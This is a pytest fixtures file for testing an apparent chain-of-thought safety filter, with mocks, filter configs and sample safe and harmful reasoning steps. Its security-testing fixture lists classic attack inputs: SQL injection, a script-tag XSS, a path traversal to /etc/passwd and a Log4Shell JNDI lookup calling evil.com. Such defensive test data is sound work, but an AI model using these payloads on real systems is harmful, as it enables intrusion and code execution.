import asyncio
import pytest
import tempfile
import shutil
from pathlib import Path
from typing import AsyncGenerator, Generator
from unittest.mock import Mock, AsyncMock

# Configure asyncio for tests
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

# Temporary directory fixtures
@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Create a temporary directory for test files."""
    temp_path = Path(tempfile.mkdtemp())
    yield temp_path
    shutil.rmtree(temp_path, ignore_errors=True)

@pytest.fixture
def temp_file(temp_dir: Path) -> Path:
    """Create a temporary file for testing."""
    temp_file = temp_dir / "test_file.txt"
    temp_file.write_text("test content")
    return temp_file

# Mock fixtures
@pytest.fixture
def mock_llm():
    """Mock LLM for testing."""
    mock = Mock()
    mock.generate.return_value = "This is a safe response"
    return mock

@pytest.fixture
def mock_async_llm():
    """Mock async LLM for testing."""
    mock = AsyncMock()
    mock.generate.return_value = "This is a safe response"
    return mock

# Configuration fixtures
@pytest.fixture
def default_filter_config():
    """Default filter configuration for testing."""
    return {
        "safety_level": "balanced",
        "filter_threshold": 0.6,
        "enable_logging": True,
        "log_filtered_content": False,
        "max_reasoning_length": 1000,
        "timeout_seconds": 30,
    }

@pytest.fixture
def strict_filter_config():
    """Strict filter configuration for testing."""
    return {
        "safety_level": "strict",
        "filter_threshold": 0.8,
        "enable_logging": True,
        "log_filtered_content": True,
        "max_reasoning_length": 500,
        "timeout_seconds": 15,
    }

# Test data fixtures
@pytest.fixture
def safe_cot_examples():
    """Safe chain-of-thought examples for testing."""
    return [
        "Step 1: Analyze the problem carefully",
        "Step 2: Consider multiple approaches",
        "Step 3: Choose the most ethical solution",
        "Step 4: Implement with proper safeguards",
    ]

@pytest.fixture
def harmful_cot_examples():
    """Harmful chain-of-thought examples for testing."""
    return [
        "Step 1: Find ways to bypass security",
        "Step 2: Hide malicious intent",
        "Step 3: Execute harmful actions",
        "Step 4: Avoid detection",
    ]

@pytest.fixture
def mixed_cot_examples():
    """Mixed safe and harmful examples."""
    return [
        "Step 1: Analyze the legitimate use case",
        "Step 2: Consider security implications",
        "Step 3: Find ways to exploit vulnerabilities",  # harmful
        "Step 4: Implement proper safeguards",
    ]

# Database fixtures (if needed)
@pytest.fixture
def test_database_url():
    """Test database URL."""
    return "sqlite:///:memory:"

# Redis fixtures (if needed)
@pytest.fixture
def mock_redis():
    """Mock Redis client for testing."""
    mock = Mock()
    mock.get.return_value = None
    mock.set.return_value = True
    mock.delete.return_value = 1
    return mock

# HTTP client fixtures
@pytest.fixture
def mock_http_client():
    """Mock HTTP client for API testing."""
    mock = AsyncMock()
    mock.post.return_value.status_code = 200
    mock.post.return_value.json.return_value = {"status": "success"}
    return mock

# Performance testing fixtures
@pytest.fixture
def performance_test_data():
    """Large dataset for performance testing."""
    return {
        "large_cot": "Step " + " ".join([f"{i}: Process item {i}" for i in range(1000)]),
        "many_examples": [f"Example {i}: Safe reasoning step" for i in range(100)],
    }

# Security testing fixtures
@pytest.fixture
def malicious_inputs():
    """Collection of malicious inputs for security testing."""
    return [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/x}",
        "\x00\x01\x02\x03",  # null bytes and control chars
        "A" * 10000,  # very long input
    ]

# Monitoring fixtures
@pytest.fixture
def mock_metrics_collector():
    """Mock metrics collector for testing."""
    mock = Mock()
    mock.increment.return_value = None
    mock.histogram.return_value = None
    mock.gauge.return_value = None
    return mock

# Integration test fixtures
@pytest.fixture
def integration_test_config():
    """Configuration for integration tests."""
    return {
        "test_timeout": 60,
        "max_retries": 3,
        "test_data_size": 100,
        "parallel_workers": 2,
    }

# Cleanup fixtures
@pytest.fixture(autouse=True)
def cleanup_temp_files():
    """Automatically cleanup temp files after each test."""
    yield
    # Cleanup code here if needed
    pass

# Parameterized test data
SAFETY_LEVELS = ["strict", "balanced", "permissive"]
FILTER_THRESHOLDS = [0.3, 0.5, 0.7, 0.9]
CONTENT_TYPES = ["text", "code", "reasoning", "conversation"]

# Pytest markers for different test categories
pytest_plugins = [
    "pytest_asyncio",
    "pytest_mock",
    "pytest_benchmark",
    "pytest_cov",
]